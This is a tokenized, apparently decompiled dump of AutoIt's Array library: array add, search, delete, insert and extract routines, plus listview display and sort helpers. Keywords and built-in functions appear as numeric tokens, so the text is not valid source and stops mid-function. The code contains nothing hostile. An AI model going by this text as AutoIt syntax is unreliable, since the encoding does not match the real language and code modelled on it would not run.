$SITEM=$SHEADER
4$INOROW5
$SITEM="Row|"&$SITEM
8
4$ICW_COLWIDTH5
$ASPLIT=331($SITEM,$SCURR_SEPARATOR)
$SITEM=""
13$J=115$ASPLIT[0]
$SITEM&=309("%-"&$ICW_COLWIDTH+1&"s",322($ASPLIT[$J],$ICW_COLWIDTH))
14
6
$SITEM=328($SITEM,$SCURR_SEPARATOR,$VUSER_SEPARATOR)
8
$SCLIP=$SITEM&@CRLF&$SCLIP
8
31($SCLIP)
297()
179($IDLISTVIEW,$_ARRAYCONSTANT_GUI_FOCUS)
21$IDLISTVIEW
__ARRAYDISPLAY_SORTITEMS($IDLISTVIEW,160($IDLISTVIEW))
21$IDUSER_FUNC
28$AISELITEMS[1]=[0]
13$I=015164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_GETITEMCOUNT,0,0)-1
4(164($IDLISTVIEW,$_ARRAYCONSTANT_LVM_GETITEMSTATE,$I,$_ARRAYCONSTANT_LVIS_SELECTED)<>0)5
$AISELITEMS[0]+=1
27$AISELITEMS[$AISELITEMS[0]+1]
$AISELITEMS[$AISELITEMS[0]]=$I+$IITEM_START
8
14
$HUSER_FUNCTION($AARRAY,$AISELITEMS)
179($IDLISTVIEW,$_ARRAYCONSTANT_GUI_FOCUS)
21$IDEXIT_SCRIPT
182($HGUI)
35
24
10
182($HGUI)
258("GUICoordMode",$ICOORDMODE)
258("GUIOnEventMode",$IONEVENTMODE)
341
33
32__ARRAYDISPLAY_REGISTERSORTCALLBACK($HWND,$VCOMPARETYPE=2,$BARROWS=39,$SSORT_CALLBACK="__ArrayDisplay_SortCallBack")
43226($HWND)5$HWND=159($HWND)
28$HHEADER=203(164($HWND,4127,0,0))
$__G_AARRAYDISPLAY_SORTINFO[1]=$HWND
$__G_AARRAYDISPLAY_SORTINFO[2]=62($SSORT_CALLBACK,"int","int;int;hwnd")
$__G_AARRAYDISPLAY_SORTINFO[3]=-1
$__G_AARRAYDISPLAY_SORTINFO[4]=-1
$__G_AARRAYDISPLAY_SORTINFO[5]=1
$__G_AARRAYDISPLAY_SORTINFO[6]=-1
$__G_AARRAYDISPLAY_SORTINFO[7]=0
$__G_AARRAYDISPLAY_SORTINFO[8]=$VCOMPARETYPE
$__G_AARRAYDISPLAY_SORTINFO[9]=$BARROWS
$__G_AARRAYDISPLAY_SORTINFO[10]=$HHEADER
34$__G_AARRAYDISPLAY_SORTINFO[2]<>0
33
32__ARRAYDISPLAY_SORTCALLBACK($NITEM1,$NITEM2,$HWND)
4$__G_AARRAYDISPLAY_SORTINFO[3]=$__G_AARRAYDISPLAY_SORTINFO[4]5
43$__G_AARRAYDISPLAY_SORTINFO[7]5
$__G_AARRAYDISPLAY_SORTINFO[5]*=-1
$__G_AARRAYDISPLAY_SORTINFO[7]=1
8
6
$__G_AARRAYDISPLAY_SORTINFO[7]=1
8
$__G_AARRAYDISPLAY_SORTINFO[6]=$__G_AARRAYDISPLAY_SORTINFO[3]
28$SVAL1=__ARRAYDISPLAY_GETITEMTEXT($HWND,$NITEM1,$__G_AARRAYDISPLAY_SORTINFO[3])
28$SVAL2=__ARRAYDISPLAY_GETITEMTEXT($HWND,$NITEM2,$__G_AARRAYDISPLAY_SORTINFO[3])
4$__G_AARRAYDISPLAY_SORTINFO[8]=15
4(316($SVAL1)2317($SVAL1))5$SVAL1=250($SVAL1)
4(316($SVAL2)2317($SVAL2))5$SVAL2=250($SVAL2)
8
28$NRESULT
4$__G_AARRAYDISPLAY_SORTINFO[8]<25
$NRESULT=0
4$SVAL1<$SVAL25
$NRESULT=-1
7$SVAL1>$SVAL25
$NRESULT=1
8
6
$NRESULT=58("shlwapi.dll","int","StrCmpLogicalW","wstr",$SVAL1,"wstr",$SVAL2)[0]
8
$NRESULT=$NRESULT*$__G_AARRAYDISPLAY_SORTINFO[5]
34$NRESULT
33
32__ARRAYDISPLAY_SORTITEMS($HWND,$ICOL)
43226($HWND)5$HWND=159($HWND)
28$PFUNCTION=61($__G_AARRAYDISPLAY_SORTINFO[2])
$__G_AARRAYDISPLAY_SORTINFO[3]=$ICOL
$__G_AARRAYDISPLAY_SORTINFO[7]=0
$__G_AARRAYDISPLAY_SORTINFO[4]=$__G_AARRAYDISPLAY_SORTINFO[6]
28$ARESULT=58("user32.dll","lresult","SendMessageW","hwnd",$HWND,"uint",4177,"hwnd",$HWND,"ptr",$PFUNCTION)
4$ARESULT[0]<>05
4$__G_AARRAYDISPLAY_SORTINFO[9]5
28$HHEADER=$__G_AARRAYDISPLAY_SORTINFO[10],$IFORMAT
13$X=015__ARRAYDISPLAY_GETITEMCOUNT($HHEADER)-1
$IFORMAT=__ARRAYDISPLAY_GETITEMFORMAT($HHEADER,$X)
417($IFORMAT,512)5
__ARRAYDISPLAY_SETITEMFORMAT($HHEADER,$X,22($IFORMAT,512))
717($IFORMAT,1024)5
__ARRAYDISPLAY_SETITEMFORMAT($HHEADER,$X,22($IFORMAT,1024))
8
14
$IFORMAT=__ARRAYDISPLAY_GETITEMFORMAT($HHEADER,$ICOL)
4$__G_AARRAYDISPLAY_SORTINFO[5]=15
__ARRAYDISPLAY_SETITEMFORMAT($HHEADER,$ICOL,19($IFORMAT,1024))
6
__ARRAYDISPLAY_SETITEMFORMAT($HHEADER,$ICOL,19($IFORMAT,512))
8
8
3439
8
3440
33
32__ARRAYDISPLAY_ADDITEM($HWND,$STEXT)
28$TITEM=65($_ARRAYCONSTANT_TAGLVITEM)
69($TITEM,"Param",0)
28$IBUFFER=323($STEXT)+1
28$TBUFFER=65("wchar Text["&$IBUFFER&"]")
$IBUFFER*=2
69($TBUFFER,"Text",$STEXT)
69($TITEM,"Text",67($TBUFFER))
69($TITEM,"TextMax",$IBUFFER)
28$IMASK=5
69($TITEM,"Mask",$IMASK)
69($TITEM,"Item",999999999)
69($TITEM,"Image",-1)
28$PITEM=67($TITEM)
28$IRET=164($HWND,4173,0,$PITEM)
34$IRET
33
32__ARRAYDISPLAY_ADDSUBITEM($HWND,$IINDEX,$STEXT,$ISUBITEM)
28$IBUFFER=323($STEXT)+1
28$TBUFFER=65("wchar Text["&$IBUFFER&"]")
$IBUFFER*=2
28$PBUFFER=67($TBUFFER)
28$TITEM=65($_ARRAYCONSTANT_TAGLVITEM)
28$IMASK=1
69($TBUFFER,"Text",$STEXT)
69($TITEM,"Mask",$IMASK)
69($TITEM,"Item",$IINDEX)
69($TITEM,"SubItem",$ISUBITEM)
69($TITEM,"Image",-1)
28$PITEM=67($TITEM)
69($TITEM,"Text",$PBUFFER)
28$IRET=164($HWND,4172,0,$PITEM)
34$IRET<>0
33
32__ARRAYDISPLAY_GETCOLUMNCOUNT($HWND)
28$HHEADER=203(164($HWND,4127,0,0))
34__ARRAYDISPLAY_GETITEMCOUNT($HHEADER)
33
32__ARRAYDISPLAY_GETHEADER($HWND)
34203(164($HWND,4127,0,0))
33
32__ARRAYDISPLAY_GETITEM($HWND,$IINDEX,36$TITEM)
28$ARESULT=58("user32.dll","lresult","SendMessageW","hwnd",$HWND,"uint",4619,"wparam",$IINDEX,"struct*",$TITEM)
34$ARESULT[0]<>0
33
32__ARRAYDISPLAY_GETITEMCOUNT($HWND)
28$ARESULT=58("user32.dll","lresult","SendMessageW","hwnd",$HWND,"uint",4608,"wparam",0,"lparam",0)
34$ARESULT[0]
33
32__ARRAYDISPLAY_GETITEMFORMAT($HWND,$IINDEX)
28$TITEM=65($_ARRAYCONSTANT_TAGHDITEM)
69($TITEM,"Mask",4)
__ARRAYDISPLAY_GETITEM($HWND,$IINDEX,$TITEM)
3466($TITEM,"Fmt")
33
32__ARRAYDISPLAY_GETITEMTEXT($HWND,$IINDEX,$ISUBITEM=0)
28$TBUFFER=65("wchar Text[4096]")
28$PBUFFER=67($TBUFFER)
28$TITEM=65($_ARRAYCONSTANT_TAGLVITEM)
69($TITEM,"SubItem",$ISUBITEM)
69($TITEM,"TextMax",4096)
69($TITEM,"Text",$PBUFFER)
4226($HWND)5
58("user32.dll","lresult","SendMessageW","hwnd",$HWND,"uint",4211,"wparam",$IINDEX,"struct*",$TITEM)
6
28$PITEM=67($TITEM)
164($HWND,4211,$IINDEX,$PITEM)
8
3466($TBUFFER,"Text")
33
32__ARRAYDISPLAY_GETITEMTEXTSTRING($HWND,$IITEM)
28$SROW="",$SSEPARATORCHAR=258("GUIDataSeparatorChar")
28$ISELECTED=$IITEM
13$X=015__ARRAYDISPLAY_GETCOLUMNCOUNT($HWND)-1
$SROW&=__ARRAYDISPLAY_GETITEMTEXT($HWND,$ISELECTED,$X)&$SSEPARATORCHAR
14
34337($SROW,1)
33
32__ARRAYDISPLAY_JUSTIFYCOLUMN($IDLISTVIEW,$IINDEX,$IALIGN=-1)
28$TCOLUMN=65("uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal")
4$IALIGN<02$IALIGN>25$IALIGN=0
69($TCOLUMN,"Mask",1)
69($TCOLUMN,"Fmt",$IALIGN)
28$PCOLUMN=67($TCOLUMN)
28$IRET=164($IDLISTVIEW,4192,$IINDEX,$PCOLUMN)
34$IRET<>0
33
32__ARRAYDISPLAY_SETITEMFORMAT($HWND,$IINDEX,$IFORMAT)
28$TITEM=65($_ARRAYCONSTANT_TAGHDITEM)
69($TITEM,"Mask",4)
69($TITEM,"Fmt",$IFORMAT)
28$ARESULT=58("user32.dll","lresult","SendMessageW","hwnd",$HWND,"uint",4620,"wparam",$IINDEX,"struct*",$TITEM)
34$ARESULT[0]<>0
33
2944$ARRAYFILL_FORCE_DEFAULT,$ARRAYFILL_FORCE_SINGLEITEM,$ARRAYFILL_FORCE_INT,$ARRAYFILL_FORCE_NUMBER,$ARRAYFILL_FORCE_PTR,$ARRAYFILL_FORCE_HWND,$ARRAYFILL_FORCE_STRING,$ARRAYFILL_FORCE_BOOLEAN
2944$ARRAYUNIQUE_NOCOUNT,$ARRAYUNIQUE_COUNT
2944$ARRAYUNIQUE_AUTO,$ARRAYUNIQUE_FORCE32,$ARRAYUNIQUE_FORCE64,$ARRAYUNIQUE_MATCH,$ARRAYUNIQUE_DISTINCT
32_ARRAYADD(36$AARRAY,$VVALUE,$ISTART=0,$SDELIM_ITEM="|",$SDELIM_ROW=@CRLF,$IFORCE=$ARRAYFILL_FORCE_DEFAULT)
4$ISTART=415$ISTART=0
4$SDELIM_ITEM=415$SDELIM_ITEM="|"
4$SDELIM_ROW=415$SDELIM_ROW=@CRLF
4$IFORCE=415$IFORCE=$ARRAYFILL_FORCE_DEFAULT
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)
28$HDATATYPE=0
23$IFORCE
21$ARRAYFILL_FORCE_INT
$HDATATYPE=217
21$ARRAYFILL_FORCE_NUMBER
$HDATATYPE=250
21$ARRAYFILL_FORCE_PTR
$HDATATYPE=273
21$ARRAYFILL_FORCE_HWND
$HDATATYPE=203
21$ARRAYFILL_FORCE_STRING
$HDATATYPE=306
21$ARRAYFILL_FORCE_BOOLEAN
$HDATATYPE="Boolean"
24
23369($AARRAY,$UBOUND_DIMENSIONS)
211
4$IFORCE=$ARRAYFILL_FORCE_SINGLEITEM5
27$AARRAY[$IDIM_1+1]
$AARRAY[$IDIM_1]=$VVALUE
34$IDIM_1
8
4219($VVALUE)5
4369($VVALUE,$UBOUND_DIMENSIONS)<>1534287(5,0,-1)
$HDATATYPE=0
6
28$ATMP=331($VVALUE,$SDELIM_ITEM,$STR_NOCOUNT+$STR_ENTIRESPLIT)
4369($ATMP,$UBOUND_ROWS)=15
$ATMP[0]=$VVALUE
8
$VVALUE=$ATMP
8
28$IADD=369($VVALUE,$UBOUND_ROWS)
27$AARRAY[$IDIM_1+$IADD]
13$I=015$IADD-1
4306($HDATATYPE)="Boolean"5
23$VVALUE[$I]
21"True","1"
$AARRAY[$IDIM_1+$I]=39
21"False","0",""
$AARRAY[$IDIM_1+$I]=40
24
7225($HDATATYPE)5
$AARRAY[$IDIM_1+$I]=$HDATATYPE($VVALUE[$I])
6
$AARRAY[$IDIM_1+$I]=$VVALUE[$I]
8
14
34$IDIM_1+$IADD-1
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)
4$ISTART<02$ISTART>$IDIM_2-1534287(4,0,-1)
28$IVALDIM_1,$IVALDIM_2=0,$ICOLCOUNT
4219($VVALUE)5
4369($VVALUE,$UBOUND_DIMENSIONS)<>2534287(5,0,-1)
$IVALDIM_1=369($VVALUE,$UBOUND_ROWS)
$IVALDIM_2=369($VVALUE,$UBOUND_COLUMNS)
$HDATATYPE=0
6
28$ASPLIT_1=331($VVALUE,$SDELIM_ROW,$STR_NOCOUNT+$STR_ENTIRESPLIT)
$IVALDIM_1=369($ASPLIT_1,$UBOUND_ROWS)
28$ATMP[$IVALDIM_1][0],$ASPLIT_2
13$I=015$IVALDIM_1-1
$ASPLIT_2=331($ASPLIT_1[$I],$SDELIM_ITEM,$STR_NOCOUNT+$STR_ENTIRESPLIT)
$ICOLCOUNT=369($ASPLIT_2)
4$ICOLCOUNT>$IVALDIM_25
$IVALDIM_2=$ICOLCOUNT
27$ATMP[$IVALDIM_1][$IVALDIM_2]
8
13$J=015$ICOLCOUNT-1
$ATMP[$I][$J]=$ASPLIT_2[$J]
14
14
$VVALUE=$ATMP
8
4369($VVALUE,$UBOUND_COLUMNS)+$ISTART>369($AARRAY,$UBOUND_COLUMNS)534287(3,0,-1)
27$AARRAY[$IDIM_1+$IVALDIM_1][$IDIM_2]
13$IWRITETO_INDEX=015$IVALDIM_1-1
13$J=015$IDIM_2-1
4$J<$ISTART5
$AARRAY[$IWRITETO_INDEX+$IDIM_1][$J]=""
7$J-$ISTART>$IVALDIM_2-15
$AARRAY[$IWRITETO_INDEX+$IDIM_1][$J]=""
6
4306($HDATATYPE)="Boolean"5
23$VVALUE[$IWRITETO_INDEX][$J-$ISTART]
21"True","1"
$AARRAY[$IWRITETO_INDEX+$IDIM_1][$J]=39
21"False","0",""
$AARRAY[$IWRITETO_INDEX+$IDIM_1][$J]=40
24
7225($HDATATYPE)5
$AARRAY[$IWRITETO_INDEX+$IDIM_1][$J]=$HDATATYPE($VVALUE[$IWRITETO_INDEX][$J-$ISTART])
6
$AARRAY[$IWRITETO_INDEX+$IDIM_1][$J]=$VVALUE[$IWRITETO_INDEX][$J-$ISTART]
8
8
14
14
216
34287(2,0,-1)
24
34369($AARRAY,$UBOUND_ROWS)-1
33
32_ARRAYBINARYSEARCH(3036$AARRAY,$VVALUE,$ISTART=0,$IEND=0,$ICOLUMN=0)
4$ISTART=415$ISTART=0
4$IEND=415$IEND=0
4$ICOLUMN=415$ICOLUMN=0
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)
4$IDIM_1=0534287(6,0,-1)
4$IEND<12$IEND>$IDIM_1-15$IEND=$IDIM_1-1
4$ISTART<05$ISTART=0
4$ISTART>$IEND534287(4,0,-1)
28$IMID=217(($IEND+$ISTART)/2)
23369($AARRAY,$UBOUND_DIMENSIONS)
211
4$AARRAY[$ISTART]>$VVALUE2$AARRAY[$IEND]<$VVALUE534287(2,0,-1)
9$ISTART<=$IMID1$VVALUE<>$AARRAY[$IMID]
4$VVALUE<$AARRAY[$IMID]5
$IEND=$IMID-1
6
$ISTART=$IMID+1
8
$IMID=217(($IEND+$ISTART)/2)
10
4$ISTART>$IEND534287(3,0,-1)
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)-1
4$ICOLUMN<02$ICOLUMN>$IDIM_2534287(7,0,-1)
4$AARRAY[$ISTART][$ICOLUMN]>$VVALUE2$AARRAY[$IEND][$ICOLUMN]<$VVALUE534287(2,0,-1)
9$ISTART<=$IMID1$VVALUE<>$AARRAY[$IMID][$ICOLUMN]
4$VVALUE<$AARRAY[$IMID][$ICOLUMN]5
$IEND=$IMID-1
6
$ISTART=$IMID+1
8
$IMID=217(($IEND+$ISTART)/2)
10
4$ISTART>$IEND534287(3,0,-1)
216
34287(5,0,-1)
24
34$IMID
33
32_ARRAYCOLDELETE(36$AARRAY,$ICOLUMN,$BCONVERT=40)
4$BCONVERT=415$BCONVERT=40
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)
4369($AARRAY,$UBOUND_DIMENSIONS)<>2534287(2,0,-1)
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)
23$IDIM_2
212
4$ICOLUMN<02$ICOLUMN>1534287(3,0,-1)
4$BCONVERT5
28$ATEMPARRAY[$IDIM_1]
13$I=015$IDIM_1-1
$ATEMPARRAY[$I]=$AARRAY[$I][(3$ICOLUMN)]
14
$AARRAY=$ATEMPARRAY
6
25
8
216
4$ICOLUMN<02$ICOLUMN>$IDIM_2-1534287(3,0,-1)
13$I=015$IDIM_1-1
13$J=$ICOLUMN15$IDIM_2-2
$AARRAY[$I][$J]=$AARRAY[$I][$J+1]
14
14
27$AARRAY[$IDIM_1][$IDIM_2-1]
24
34369($AARRAY,$UBOUND_COLUMNS)
33
32_ARRAYCOLINSERT(36$AARRAY,$ICOLUMN)
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)
23369($AARRAY,$UBOUND_DIMENSIONS)
211
28$ATEMPARRAY[$IDIM_1][2]
23$ICOLUMN
210,1
13$I=015$IDIM_1-1
$ATEMPARRAY[$I][(3$ICOLUMN)]=$AARRAY[$I]
14
216
34287(3,0,-1)
24
$AARRAY=$ATEMPARRAY
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)
4$ICOLUMN<02$ICOLUMN>$IDIM_2534287(3,0,-1)
27$AARRAY[$IDIM_1][$IDIM_2+1]
13$I=015$IDIM_1-1
13$J=$IDIM_215$ICOLUMN+116-1
$AARRAY[$I][$J]=$AARRAY[$I][$J-1]
14
$AARRAY[$I][$ICOLUMN]=""
14
216
34287(2,0,-1)
24
34369($AARRAY,$UBOUND_COLUMNS)
33
32_ARRAYCOMBINATIONS(3036$AARRAY,$ISET,$SDELIMITER="")
4$SDELIMITER=415$SDELIMITER=""
43219($AARRAY)534287(1,0,0)
4369($AARRAY,$UBOUND_DIMENSIONS)<>1534287(2,0,0)
28$IN=369($AARRAY)
28$IR=$ISET
28$AIDX[$IR]
13$I=015$IR-1
$AIDX[$I]=$I
14
28$ITOTAL=__ARRAY_COMBINATIONS($IN,$IR)
28$ILEFT=$ITOTAL
28$ARESULT[$ITOTAL+1]
$ARESULT[0]=$ITOTAL
28$ICOUNT=1
9$ILEFT>0
__ARRAY_GETNEXT($IN,$IR,$ILEFT,$ITOTAL,$AIDX)
13$I=015$ISET-1
$ARESULT[$ICOUNT]&=$AARRAY[$AIDX[$I]]&$SDELIMITER
14
4$SDELIMITER<>""5$ARESULT[$ICOUNT]=337($ARESULT[$ICOUNT],1)
$ICOUNT+=1
10
34$ARESULT
33
32_ARRAYCONCATENATE(36$AARRAYTARGET,3036$AARRAYSOURCE,$ISTART=0)
4$ISTART=415$ISTART=0
43219($AARRAYTARGET)534287(1,0,-1)
43219($AARRAYSOURCE)534287(2,0,-1)
28$IDIM_TOTAL_TGT=369($AARRAYTARGET,$UBOUND_DIMENSIONS)
28$IDIM_TOTAL_SRC=369($AARRAYSOURCE,$UBOUND_DIMENSIONS)
28$IDIM_1_TGT=369($AARRAYTARGET,$UBOUND_ROWS)
28$IDIM_1_SRC=369($AARRAYSOURCE,$UBOUND_ROWS)
4$ISTART<02$ISTART>$IDIM_1_SRC-1534287(6,0,-1)
23$IDIM_TOTAL_TGT
211
4$IDIM_TOTAL_SRC<>1534287(4,0,-1)
27$AARRAYTARGET[$IDIM_1_TGT+$IDIM_1_SRC-$ISTART]
13$I=$ISTART15$IDIM_1_SRC-1
$AARRAYTARGET[$IDIM_1_TGT+$I-$ISTART]=$AARRAYSOURCE[$I]
14
212
4$IDIM_TOTAL_SRC<>2534287(4,0,-1)
28$IDIM_2_TGT=369($AARRAYTARGET,$UBOUND_COLUMNS)
4369($AARRAYSOURCE,$UBOUND_COLUMNS)<>$IDIM_2_TGT534287(5,0,-1)
27$AARRAYTARGET[$IDIM_1_TGT+$IDIM_1_SRC-$ISTART][$IDIM_2_TGT]
13$I=$ISTART15$IDIM_1_SRC-1
13$J=015$IDIM_2_TGT-1
$AARRAYTARGET[$IDIM_1_TGT+$I-$ISTART][$J]=$AARRAYSOURCE[$I][$J]
14
14
216
34287(3,0,-1)
24
34369($AARRAYTARGET,$UBOUND_ROWS)
33
32_ARRAYDELETE(36$AARRAY,$VRANGE)
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)-1
4219($VRANGE)5
4369($VRANGE,$UBOUND_DIMENSIONS)<>12369($VRANGE,$UBOUND_ROWS)<2534287(4,0,-1)
6
28$INUMBER,$ASPLIT_1,$ASPLIT_2
$VRANGE=333($VRANGE,8)
$ASPLIT_1=331($VRANGE,";")
$VRANGE=""
13$I=115$ASPLIT_1[0]
43326($ASPLIT_1[$I],"^\d+(-\d+)?$")534287(3,0,-1)
$ASPLIT_2=331($ASPLIT_1[$I],"-")
23$ASPLIT_2[0]
211
$VRANGE&=$ASPLIT_2[1]&";"
212
4250($ASPLIT_2[2])>=250($ASPLIT_2[1])5
$INUMBER=$ASPLIT_2[1]-1
11
$INUMBER+=1
$VRANGE&=$INUMBER&";"
12$INUMBER=$ASPLIT_2[2]
8
24
14
$VRANGE=331(337($VRANGE,1),";")
8
4$VRANGE[1]<02$VRANGE[$VRANGE[0]]>$IDIM_1534287(5,0,-1)
28$ICOPYTO_INDEX=0
23369($AARRAY,$UBOUND_DIMENSIONS)
211
13$I=115$VRANGE[0]
$AARRAY[$VRANGE[$I]]=29(64177)
14
13$IREADFROM_INDEX=015$IDIM_1
4$AARRAY[$IREADFROM_INDEX]==29(64177)5
19
6
4$IREADFROM_INDEX<>$ICOPYTO_INDEX5
$AARRAY[$ICOPYTO_INDEX]=$AARRAY[$IREADFROM_INDEX]
8
$ICOPYTO_INDEX+=1
8
14
27$AARRAY[$IDIM_1-$VRANGE[0]+1]
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)-1
13$I=115$VRANGE[0]
$AARRAY[$VRANGE[$I]][0]=29(64177)
14
13$IREADFROM_INDEX=015$IDIM_1
4$AARRAY[$IREADFROM_INDEX][0]==29(64177)5
19
6
4$IREADFROM_INDEX<>$ICOPYTO_INDEX5
13$J=015$IDIM_2
$AARRAY[$ICOPYTO_INDEX][$J]=$AARRAY[$IREADFROM_INDEX][$J]
14
8
$ICOPYTO_INDEX+=1
8
14
27$AARRAY[$IDIM_1-$VRANGE[0]+1][$IDIM_2+1]
216
34287(2,0,40)
24
34369($AARRAY,$UBOUND_ROWS)
33
32_ARRAYDISPLAY(3036$AARRAY,$STITLE=41,$SARRAYRANGE=41,$IFLAGS=41,$VUSER_SEPARATOR=41,$SHEADER=41,$IMAX_COLWIDTH=41)
28$IRET=__ARRAYDISPLAY_SHARE($AARRAY,$STITLE,$SARRAYRANGE,$IFLAGS,41,$SHEADER,$IMAX_COLWIDTH,0,40)
34287(@ERROR,@EXTENDED,$IRET)
33
32_ARRAYEXTRACT(3036$AARRAY,$ISTART_ROW=-1,$IEND_ROW=-1,$ISTART_COL=-1,$IEND_COL=-1)
4$ISTART_ROW=415$ISTART_ROW=-1
4$IEND_ROW=415$IEND_ROW=-1
4$ISTART_COL=415$ISTART_COL=-1
4$IEND_COL=415$IEND_COL=-1
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)-1
4$IEND_ROW=-15$IEND_ROW=$IDIM_1
4$ISTART_ROW=-15$ISTART_ROW=0
4$ISTART_ROW<-12$IEND_ROW<-1534287(3,0,-1)
4$ISTART_ROW>$IDIM_12$IEND_ROW>$IDIM_1534287(3,0,-1)
4$ISTART_ROW>$IEND_ROW534287(4,0,-1)
23369($AARRAY,$UBOUND_DIMENSIONS)
211
28$ARETARRAY[$IEND_ROW-$ISTART_ROW+1]
13$I=015$IEND_ROW-$ISTART_ROW
$ARETARRAY[$I]=$AARRAY[$I+$ISTART_ROW]
14
34$ARETARRAY
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)-1
4$IEND_COL=-15$IEND_COL=$IDIM_2
4$ISTART_COL=-15$ISTART_COL=0
4$ISTART_COL<-12$IEND_COL<-1534287(5,0,-1)
4$ISTART_COL>$IDIM_22$IEND_COL>$IDIM_2534287(5,0,-1)
4$ISTART_COL>$IEND_COL534287(6,0,-1)
4$ISTART_COL=$IEND_COL5
28$ARETARRAY[$IEND_ROW-$ISTART_ROW+1]
6
28$ARETARRAY[$IEND_ROW-$ISTART_ROW+1][$IEND_COL-$ISTART_COL+1]
8
13$I=015$IEND_ROW-$ISTART_ROW
13$J=015$IEND_COL-$ISTART_COL
4$ISTART_COL=$IEND_COL5
$ARETARRAY[$I]=$AARRAY[$I+$ISTART_ROW][$J+$ISTART_COL]
6
$ARETARRAY[$I][$J]=$AARRAY[$I+$ISTART_ROW][$J+$ISTART_COL]
8
14
14
34$ARETARRAY
216
34287(2,0,-1)
24
341
33
32_ARRAYFINDALL(3036$AARRAY,$VVALUE,$ISTART=0,$IEND=0,$ICASE=0,$ICOMPARE=0,$ISUBITEM=0,$BROW=40)
4$ISTART=415$ISTART=0
4$IEND=415$IEND=0
4$ICASE=415$ICASE=0
4$ICOMPARE=415$ICOMPARE=0
4$ISUBITEM=415$ISUBITEM=0
4$BROW=415$BROW=40
$ISTART=_ARRAYSEARCH($AARRAY,$VVALUE,$ISTART,$IEND,$ICASE,$ICOMPARE,1,$ISUBITEM,$BROW)
4@ERROR534287(@ERROR,0,-1)
28$IINDEX=0,$AVRESULT[369($AARRAY,($BROW$UBOUND_COLUMNS$UBOUND_ROWS))]
11
$AVRESULT[$IINDEX]=$ISTART
$IINDEX+=1
$ISTART=_ARRAYSEARCH($AARRAY,$VVALUE,$ISTART+1,$IEND,$ICASE,$ICOMPARE,1,$ISUBITEM,$BROW)
12@ERROR
27$AVRESULT[$IINDEX]
34$AVRESULT
33
32_ARRAYINSERT(36$AARRAY,$VRANGE,$VVALUE="",$ISTART=0,$SDELIM_ITEM="|",$SDELIM_ROW=@CRLF,$IFORCE=$ARRAYFILL_FORCE_DEFAULT)
4$VVALUE=415$VVALUE=""
4$ISTART=415$ISTART=0
4$SDELIM_ITEM=415$SDELIM_ITEM="|"
4$SDELIM_ROW=415$SDELIM_ROW=@CRLF
4$IFORCE=415$IFORCE=$ARRAYFILL_FORCE_DEFAULT
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)-1
28$HDATATYPE=0
23$IFORCE
21$ARRAYFILL_FORCE_INT
$HDATATYPE=217
21$ARRAYFILL_FORCE_NUMBER
$HDATATYPE=250
21$ARRAYFILL_FORCE_PTR
$HDATATYPE=273
21$ARRAYFILL_FORCE_HWND
$HDATATYPE=203
21$ARRAYFILL_FORCE_STRING
$HDATATYPE=306
24
28$ASPLIT_1,$ASPLIT_2
4219($VRANGE)5
4369($VRANGE,$UBOUND_DIMENSIONS)<>12369($VRANGE,$UBOUND_ROWS)<2534287(4,0,-1)
6
28$INUMBER
$VRANGE=333($VRANGE,8)
$ASPLIT_1=331($VRANGE,";")
$VRANGE=""
13$I=115$ASPLIT_1[0]
43326($ASPLIT_1[$I],"^\d+(-\d+)?$")534287(3,0,-1)
$ASPLIT_2=331($ASPLIT_1[$I],"-")
23$ASPLIT_2[0]
211
$VRANGE&=$ASPLIT_2[1]&";"
212
4250($ASPLIT_2[2])>=250($ASPLIT_2[1])5
$INUMBER=$ASPLIT_2[1]-1
11
$INUMBER+=1
$VRANGE&=$INUMBER&";"
12$INUMBER=$ASPLIT_2[2]
8
24
14
$VRANGE=331(337($VRANGE,1),";")
8
4$VRANGE[1]<02$VRANGE[$VRANGE[0]]>$IDIM_1534287(5,0,-1)
13$I=215$VRANGE[0]
4$VRANGE[$I]<$VRANGE[$I-1]534287(3,0,-1)
14
28$ICOPYTO_INDEX=$IDIM_1+$VRANGE[0]
28$IINSERTPOINT_INDEX=$VRANGE[0]
28$IINSERT_INDEX=$VRANGE[$IINSERTPOINT_INDEX]
23369($AARRAY,$UBOUND_DIMENSIONS)
211
4$IFORCE=$ARRAYFILL_FORCE_SINGLEITEM5
27$AARRAY[$IDIM_1+$VRANGE[0]+1]
13$IREADFROMINDEX=$IDIM_115016-1
$AARRAY[$ICOPYTO_INDEX]=$AARRAY[$IREADFROMINDEX]
$ICOPYTO_INDEX-=1
$IINSERT_INDEX=$VRANGE[$IINSERTPOINT_INDEX]
9$IREADFROMINDEX=$IINSERT_INDEX
$AARRAY[$ICOPYTO_INDEX]=$VVALUE
$ICOPYTO_INDEX-=1
$IINSERTPOINT_INDEX-=1
4$IINSERTPOINT_INDEX<15182
$IINSERT_INDEX=$VRANGE[$IINSERTPOINT_INDEX]
10
14
34$IDIM_1+$VRANGE[0]+1
8
27$AARRAY[$IDIM_1+$VRANGE[0]+1]
4219($VVALUE)5
4369($VVALUE,$UBOUND_DIMENSIONS)<>1534287(5,0,-1)
$HDATATYPE=0
6
28$ATMP=331($VVALUE,$SDELIM_ITEM,$STR_NOCOUNT+$STR_ENTIRESPLIT)
4369($ATMP,$UBOUND_ROWS)=15
$ATMP[0]=$VVALUE
$HDATATYPE=0
8
$VVALUE=$ATMP
8
13$IREADFROMINDEX=$IDIM_115016-1
$AARRAY[$ICOPYTO_INDEX]=$AARRAY[$IREADFROMINDEX]
$ICOPYTO_INDEX-=1
$IINSERT_INDEX=$VRANGE[$IINSERTPOINT_INDEX]
